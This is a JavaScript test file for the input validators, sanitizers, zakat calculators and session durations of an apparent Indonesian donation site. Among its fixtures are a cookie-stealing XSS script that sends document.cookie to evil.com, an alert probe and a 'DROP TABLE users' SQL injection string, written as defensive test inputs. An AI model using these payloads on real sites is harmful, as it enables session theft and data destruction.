import { describe, it, expect } from "vitest";
import {
  validateDonationAmount,
  validateName,
  validatePhone,
  validateEmail,
  sanitizePrayer,
  sanitizeInput,
  stripEmojis,
  sanitizeSlug,
  sanitizeSearchQuery,
  sanitizeDigitsOnly,
  sanitizeStandardText,
  DONATION_LIMITS,
} from "@/lib/security";
import {
  calculateZakatPenghasilan,
  calculateZakatMaal,
} from "@/lib/zakat/calculations";
import {
  USER_ROLES,
  SESSION_DURATIONS,
  getSessionDuration,
  getOAuthSessionDuration,
} from "@/services/authService";

describe("Security & Anomaly Defense: Validasi Nominal Donasi", () => {
  it("menolak nominal bernilai negatif (anomali balance manipulasi)", () => {
    const res = validateDonationAmount(-50000);
    expect(res.isValid).toBe(false);
  });

  it("menolak nominal bernilai nol (zero-value attack)", () => {
    const res = validateDonationAmount(0);
    expect(res.isValid).toBe(false);
  });

  it("menolak nominal di bawah ambang batas minimum Rp 10.000", () => {
    const res = validateDonationAmount(9999);
    expect(res.isValid).toBe(false);
    expect(res.message).toContain("minimal Rp");
  });

  it("menolak nominal di atas ambang batas maksimum Rp 100.000.000 (overflow)", () => {
    const res = validateDonationAmount(100000001);
    expect(res.isValid).toBe(false);
    expect(res.message).toContain("maksimal Rp");
  });

  it("menolak input non-numerik, NaN, atau objek anomali", () => {
    expect(validateDonationAmount("seratus ribu").isValid).toBe(false);
    expect(validateDonationAmount(NaN).isValid).toBe(false);
    expect(validateDonationAmount(null).isValid).toBe(false);
    expect(validateDonationAmount(undefined).isValid).toBe(false);
  });

  it("menerima batas valid donasi batas bawah dan atas", () => {
    expect(validateDonationAmount(DONATION_LIMITS.MIN_AMOUNT).isValid).toBe(true);
    expect(validateDonationAmount(DONATION_LIMITS.MAX_AMOUNT).isValid).toBe(true);
    expect(validateDonationAmount(50000).isValid).toBe(true);
  });
});

describe("Security & Anomaly Defense: Sanitasi XSS & Injeksi Karakter", () => {
  it("menetralisir tag HTML berbahaya dan script injection", () => {
    const maliciousPayload = "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>Semoga bermanfaat";
    const cleaned = sanitizeInput(maliciousPayload);

    expect(cleaned).not.toContain("<script>");
    expect(cleaned).not.toContain("</script>");
    expect(cleaned).toContain("Semoga bermanfaat");
  });

  it("memotong string doa berlebih jika melampaui batas 200 karakter", () => {
    const longPrayer = "A".repeat(300);
    const cleaned = sanitizePrayer(longPrayer);

    expect(cleaned.length).toBeLessThanOrEqual(200);
  });

  it("menghapus karakter emoji spam dari field input", () => {
    const spamEmojis = "Donatur Dermawan 🚀🔥💰🤑🎉";
    const cleaned = stripEmojis(spamEmojis).trim();

    expect(cleaned).toBe("Donatur Dermawan");
  });

  it("menolak nama jika hanya berisi angka atau simbol berbahaya", () => {
    const res1 = validateName("12345678");
    expect(res1.isValid).toBe(false);

    const res2 = validateName("<script>");
    expect(res2.isValid).toBe(false);
  });
});

describe("Security & Anomaly Defense: Nomor Telepon & Email Anomali", () => {
  it("menolak nomor telepon non-Indonesia dan karakter alfabet", () => {
    expect(validatePhone("12345").isValid).toBe(false);
    expect(validatePhone("+14155552671").isValid).toBe(false);
    expect(validatePhone("0812ABCD890").isValid).toBe(false);
  });

  it("menerima nomor telepon Indonesia yang sah (08xx atau 628xx)", () => {
    expect(validatePhone("081234567890").isValid).toBe(true);
    expect(validatePhone("6281234567890").isValid).toBe(true);
  });

  it("menolak format email anomali tanpa domain atau simbol ganda", () => {
    expect(validateEmail("user@", true).isValid).toBe(false);
    expect(validateEmail("user@.com", true).isValid).toBe(false);
    expect(validateEmail("user@@domain.com", true).isValid).toBe(false);
  });
});

describe("Security & Anomaly Defense: Kalkulasi Zakat Terhadap Nilai Ekstrem & Negatif", () => {
  it("menghasilkan 0 jika penghasilan atau gaji bernilai negatif (tidak crash / tidak minus)", () => {
    const result = calculateZakatPenghasilan({ gaji: -50000000, penghasilanLain: -10000000 });
    expect(result.netAmount).toBe(0);
    expect(result.zakatAmount).toBe(0);
    expect(result.isNisabMet).toBe(false);
  });

  it("menghasilkan kalkulasi akurat pada angka batas wajar di atas nisab", () => {
    const result = calculateZakatPenghasilan({ gaji: 20000000, penghasilanLain: 0 });
    expect(result.netAmount).toBe(20000000);
    expect(result.zakatAmount).toBe(500000); // 2.5% dari 20jt
    expect(result.isNisabMet).toBe(true);
  });

  it("menangani zakat maal dengan utang melebihi total aset tanpa nilai minus", () => {
    const result = calculateZakatMaal({
      uangTunaiTabungan: 10000000,
      utangJatuhTempo: 50000000, // Utang lebih besar dari tabungan
    });
    expect(result.netAmount).toBe(0);
    expect(result.zakatAmount).toBe(0);
  });
});

describe("Security & Form Input Hardening: Sanitizer Standar Terpusat", () => {
  it("sanitizeSlug membersihkan spasi, karakter non-URL, kompresi strip, dan leading dash", () => {
    // Mempertahankan trailing dash agar pengguna tetap bisa mengetik tanda strip antar kata saat onChange
    expect(sanitizeSlug("  Pendidikan & Dakwah 2026!  ")).toBe("pendidikan-dakwah-2026-");
    expect(sanitizeSlug("---kategori---baru---")).toBe("kategori-baru-");
    expect(sanitizeSlug("Berita🎉 Yayasan")).toBe("berita-yayasan");
  });

  it("sanitizeSearchQuery mencegah leading space, kompresi double space, dan filter karakter injeksi", () => {
    expect(sanitizeSearchQuery("   kata kunci   ganda  ")).toBe("kata kunci ganda ");
    expect(sanitizeSearchQuery("search<script>alert(1)</script>")).toBe("searchscriptalert1/script");
    expect(sanitizeSearchQuery("cari'; DROP TABLE users;--")).toBe("cari DROP TABLE users--");
  });

  it("sanitizeDigitsOnly secara mutlak memblokir huruf dan simbol", () => {
    expect(sanitizeDigitsOnly("2024e-5")).toBe("20245");
    expect(sanitizeDigitsOnly("-2024+")).toBe("2024");
    expect(sanitizeDigitsOnly("abc123xyz")).toBe("123");
  });

  it("sanitizeStandardText mencegah leading space, kompresi spasi ganda, dan menghapus tag HTML/emoji", () => {
    expect(sanitizeStandardText("   Judul   Program   Kebaikan   ")).toBe("Judul Program Kebaikan ");
    expect(sanitizeStandardText("<p>Teks normal 😊</p>")).toBe("Teks normal ");
  });
});

describe("Session Security & Durations Architecture (SSOT)", () => {
  it("durasi default manual login: 12 jam untuk Staf dan 7 hari untuk Donatur", () => {
    expect(getSessionDuration(USER_ROLES.SUPER_ADMIN, false)).toBe(SESSION_DURATIONS.ADMIN_DEFAULT);
    expect(getSessionDuration(USER_ROLES.ADMIN, false)).toBe(12 * 60 * 60);
    expect(getSessionDuration(USER_ROLES.FINANCE, false)).toBe(12 * 60 * 60);
    expect(getSessionDuration(USER_ROLES.VOLUNTEER, false)).toBe(12 * 60 * 60);
    expect(getSessionDuration(USER_ROLES.DONOR, false)).toBe(SESSION_DURATIONS.DONOR_DEFAULT);
    expect(getSessionDuration(USER_ROLES.DONOR, false)).toBe(7 * 24 * 60 * 60);
  });

  it("durasi 'Ingat Saya' manual login: 24 jam untuk Staf dan 30 hari untuk Donatur", () => {
    expect(getSessionDuration(USER_ROLES.SUPER_ADMIN, true)).toBe(SESSION_DURATIONS.ADMIN_REMEMBER);
    expect(getSessionDuration(USER_ROLES.ADMIN, true)).toBe(24 * 60 * 60);
    expect(getSessionDuration(USER_ROLES.DONOR, true)).toBe(SESSION_DURATIONS.DONOR_REMEMBER);
    expect(getSessionDuration(USER_ROLES.DONOR, true)).toBe(30 * 24 * 60 * 60);
  });

  it("durasi OAuth (Google / Facebook): Donatur otomatis 30 hari, Staf tetap ketat 12 jam", () => {
    // Donatur mendapatkan 30 hari otomatis untuk kenyamanan UX di perangkat pribadi
    expect(getOAuthSessionDuration(USER_ROLES.DONOR)).toBe(SESSION_DURATIONS.DONOR_OAUTH);
    expect(getOAuthSessionDuration(USER_ROLES.DONOR)).toBe(30 * 24 * 60 * 60);

    // Staf/Admin tetap 12 jam demi kepatuhan keamanan data & keuangan yayasan
    expect(getOAuthSessionDuration(USER_ROLES.ADMIN)).toBe(SESSION_DURATIONS.ADMIN_DEFAULT);
    expect(getOAuthSessionDuration(USER_ROLES.SUPER_ADMIN)).toBe(12 * 60 * 60);
    expect(getOAuthSessionDuration(USER_ROLES.FINANCE)).toBe(12 * 60 * 60);
  });
});

